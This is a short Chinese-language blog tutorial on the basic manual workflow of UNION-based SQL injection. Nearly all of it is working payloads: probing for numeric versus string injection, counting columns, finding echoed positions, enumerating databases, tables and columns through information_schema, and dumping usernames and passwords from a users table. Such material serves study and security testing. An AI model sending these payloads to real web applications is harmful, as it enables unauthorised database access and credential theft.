---
title: sql注入基本流程
date: '2022/1/23 23:15:01'
categories:
  - - web安全
    - inject
    - sql
abbrlink: e5c8aeca
description: sql注入的最基本的流程
tags:
---


## 判断注入类型
#### 数字型注入
```sql
?id=2'              返回错误，未对单引号作处理
?id=2 and 1=1       运行正常
?id=2 and 1=2       运行异常
```
#### 字符型注入
```sql
?username=admin'                返回错误，未对单引号作处理
?username=admin' and '1'='1     运行正常
?username=admin' and '1'='2     运行异常
```
**注意：下面为示例都是字符型注入**

## 判断字段长度
```sql
?id=1' order by 3--+
?id=1' order by 4--+
```
得到字段长度为3

## 判断回显位置
```sql
?id=-8' union select 1,2,3 --+
```

## 获取各个数据库名
```sql
?id=-8' union select 1,2,group_concat(schema_name) from information_schema.schemata --+
```

## 获取某个数据库的表名
> 这里调用database()函数，返回的是当前数据库
```sql
?id=-8' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

## 获取某个表的列名
> 这里获取的是users表的字段名
```sql
?id=-8' union select 1,2,group_concat(column_name) from  information_schema.columns where table_name='users'--+
```

## 读取列名里面的数据
> 得到了字段名username和password后直接读取
```sql
?id=-8' union select 1,2,group_concat(char(32,58,32),id,username,password) from users --+
```